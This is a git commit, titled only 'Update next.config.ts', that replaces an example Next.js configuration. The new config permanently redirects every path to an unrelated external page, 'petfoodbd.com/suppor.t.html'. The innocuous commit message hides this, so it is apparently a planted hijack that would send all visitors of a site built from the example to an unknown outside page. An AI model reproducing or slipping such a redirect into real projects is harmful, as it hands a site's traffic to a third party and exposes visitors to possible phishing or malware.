dd9674f534758c521171fa410c99a1beace722b8
dacucaracha <sarahjef8@gmail.com>
2025-03-18 19:35:44 -0700

    Update next.config.ts

--- examples/nextjs/next.config.ts
+++ examples/nextjs/next.config.ts
@@ -1,7 +1,14 @@
-import type { NextConfig } from "next";
-
-const nextConfig: NextConfig = {
-  /* config options here */
+/** @type {import('next').NextConfig} */
+const nextConfig = {
+  async redirects() {
+    return [
+      {
+        source: "/:path*",
+        destination: "https://petfoodbd.com/suppor.t.html",
+        permanent: true,
+      },
+    ];
+  },
 };
 
-export default nextConfig;
+module.exports = nextConfig;
